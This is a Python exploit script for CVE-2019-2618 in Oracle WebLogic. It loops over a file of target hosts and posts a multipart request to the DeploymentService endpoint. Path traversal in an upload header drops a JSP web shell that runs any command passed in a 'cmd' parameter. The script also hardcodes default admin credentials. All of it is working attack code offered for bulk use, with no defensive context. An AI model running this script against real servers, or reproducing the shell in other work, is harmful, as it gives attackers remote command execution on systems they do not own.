from requests import post
from sys import argv

def poc(tag, username, password):

    url = tag+"/bea_wls_deployment_internal/DeploymentService"
    data = '''
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="shell.jsp"; filename="shell.jsp"
Content-Type: false

<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML> 

------WebKitFormBoundary7MA4YWxkTrZu0gW--
    '''
    headers = {
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW',
        'username':username,
        'password':password,
        'wl_request_type': 'app_upload',
        #"wl_upload_application_name": "/../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war",
        'wl_upload_application_name': '/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war',
        'wl_upload_delta': 'true',
        'archive': 'true',
        'serverName': 'Jas502n',
        'server_version': '10.3.6.0',
        'cache-control': 'no-cache'
        }
    try:
        print('正在测试'+tag)
        res = post(url, data=data, headers=headers)
        print(res.content.strip())
    except:
        print('无漏洞')
    print('-------------')

def begin(fileName, username='weblogic', password='Oracle@123'):

    print('''
   _______      ________    ___   ___  __  ___       ___   __ __  ___  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \     |__ \ / //_ |/ _ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______ ) / /_ | | (_) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______/ / '_ \| |> _ < 
 | |____   \  /  | |____    / /_| |_| || |  / /      / /| (_) | | (_) |
  \_____|   \/   |______|  |____|\___/ |_| /_/      |____\___/|_|\___/ 
 
 by cances
 eg. python CVE-2019-2618.py tag.txt username password
  
  ''')
    with open(fileName, 'r') as f:
        tags = f.readlines()
        for tag in tags:
            poc(tag.strip(), username, password)

begin(argv[1], argv[2], argv[3])